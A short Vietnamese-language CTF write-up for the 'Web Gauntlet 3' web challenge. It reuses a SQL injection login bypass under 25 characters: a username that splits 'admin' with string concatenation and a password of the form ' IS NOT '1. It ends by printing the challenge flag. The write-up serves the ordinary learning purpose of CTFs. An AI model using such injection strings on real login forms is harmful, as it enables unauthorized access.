# Web Gauntlet 3

![image.png](Web%20Gauntlet%203/image.png)

Đây là bài cuối cùng trong trong số 3 bài Web Gauntlet, bài này ở phần miêu tả bài có cho chúng ta biết thêm là chỉ được giới hạn trong 25 kí tự 

![image.png](Web%20Gauntlet%203/image%201.png)

![image.png](Web%20Gauntlet%203/image%202.png)

Về giao diện và filter thì nó giống hết như trong bài Web Gauntlet 2 và 1 điều trùng hợp là payload mà mình dùng để bytepass ở Web Gauntlet 2 cũng ít hơn 25 kí tự, phù hợp với điều kiện của Web Gauntlet 3 luôn nên mình sẽ dùng lại payload đó, mọi người có thể tham khảo [tại đây](https://github.com/vanduc-sec/Writeup/blob/main/Writeup/PICO%20CTF/WEB/Web%20Gauntlet%202.md) 

payload: 

`username`

```
admi'||'n
```

`password`

```
' IS NOT '1
```

![image.png](Web%20Gauntlet%203/image%203.png)

Mình đã thành công đăng nhập giờ mình sẽ qua filter.php để lấy flag

![image.png](Web%20Gauntlet%203/image%204.png)

academy{k3ep_1t_sh0rt_2e11b173}